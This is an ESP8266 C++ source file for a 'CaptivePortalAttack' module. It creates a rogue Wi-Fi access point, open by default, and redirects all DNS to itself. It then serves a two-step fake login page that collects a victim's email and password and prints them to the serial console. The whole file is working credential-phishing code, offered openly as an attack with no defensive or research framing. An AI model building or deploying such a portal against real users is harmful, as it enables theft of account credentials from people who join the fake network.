#include "CaptivePortalAttack.h"
#include "CaptivePages.h"

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

static DNSServer dns;
static ESP8266WebServer web(80);  // Back to port 80
static bool isRunning = false;
static String apSsid, apPass, lastEmail, lastPass;

static const byte DNS_PORT = 53;

static void testHandler() {
  Serial.println(F("[Captive] *** TEST ENDPOINT HIT ***"));
  web.send(200, "text/plain", "CAPTIVE PORTAL TEST - IF YOU SEE THIS, THE WEB SERVER IS WORKING!");
}

static void serveLogin() {
  Serial.println(F("[Captive] *** HTTP REQUEST RECEIVED ***"));
  Serial.println(F("[Captive] Client IP: ") + web.client().remoteIP().toString());
  Serial.println(F("[Captive] Request URI: ") + web.uri());
  
  // Serve step 1 page exactly like working version
  web.send_P(200, "text/html", PAGE_STEP1);
  Serial.println(F("[Captive] Served step1 page"));
}

static void handleStep1() {
  lastEmail = web.hasArg("email") ? web.arg("email") : "";
  
  Serial.println(F("[Captive] Step1 submitted, redirecting to step2"));
  
  // Go to step 2 with ?e= query for greeting (exactly like working version)
  String next = "/step2?e=" + lastEmail;
  web.sendHeader("Location", next, true);
  web.send(302, "text/plain", "");
}

static void handleStep2Page() {
  Serial.println(F("[Captive] Serving step2 page"));
  web.send_P(200, "text/html", PAGE_STEP2);
}

static void handleStep2() {
  lastPass = web.hasArg("password") ? web.arg("password") : "";

  // Log to Serial exactly like working version
  Serial.println(F("--- Submission ---"));
  Serial.print(F("Email: ")); Serial.println(lastEmail);
  Serial.print(F("Pass : ")); Serial.println(lastPass);
  Serial.println(F("------------------"));

  web.send_P(200, "text/html", PAGE_DONE);
}

static void captiveRedirect() { 
  Serial.println(F("[Captive] 404 - redirecting to main page"));
  web.sendHeader("Location", "/", true); 
  web.send(302, "text/plain", ""); 
}

void CaptivePortalAttack::start(const String& ssid, bool open_ap, const String& pass) {
  if (isRunning) return;
  apSsid = ssid; apPass = pass;

  Serial.println(F("[Captive] Starting captive portal..."));
  Serial.print(F("[Captive] Free heap before start: ")); Serial.println(ESP.getFreeHeap());

  // Simple WiFi setup like the working standalone version
  WiFi.mode(WIFI_AP);
  if (open_ap || pass.length() == 0) {
    WiFi.softAP(apSsid.c_str());  // Open AP like your working version
  } else {
    WiFi.softAP(apSsid.c_str(), apPass.c_str());
  }
  delay(250);  // Same delay as working version

  Serial.print(F("[Captive] AP created, IP: ")); Serial.println(WiFi.softAPIP());

  // Simple DNS setup like working version
  dns.start(DNS_PORT, "*", WiFi.softAPIP());
  Serial.println(F("[Captive] DNS server started"));

  // Web server setup exactly like working version
  web.on("/", HTTP_GET, serveLogin);
  web.on("/test", HTTP_GET, testHandler);  // Test endpoint
  web.on("/step1", HTTP_POST, handleStep1);
  web.on("/step2", HTTP_GET, handleStep2Page);
  web.on("/step2", HTTP_POST, handleStep2);
  web.onNotFound(captiveRedirect);

  web.begin();
  Serial.println(F("[Captive] Web server started on port 80"));
  Serial.println(F("[Captive] Test URL: http://192.168.4.1/test"));
  
  isRunning = true;

  Serial.print(F("[Captive] UP on ")); Serial.println(apSsid);
  Serial.print(F("[Captive] IP: ")); Serial.println(WiFi.softAPIP());
  Serial.print(F("[Captive] Free heap after start: ")); Serial.println(ESP.getFreeHeap());
}

void CaptivePortalAttack::stop() {
  if (!isRunning) return;
  web.stop();
  dns.stop();
  WiFi.softAPdisconnect(true);
  isRunning = false;
  Serial.println(F("[Captive] Stopped"));
}

void CaptivePortalAttack::loop() {
  if (!isRunning) return;
  
  // Simple loop like your working version
  dns.processNextRequest();
  web.handleClient();
}

bool CaptivePortalAttack::running() { return isRunning; }
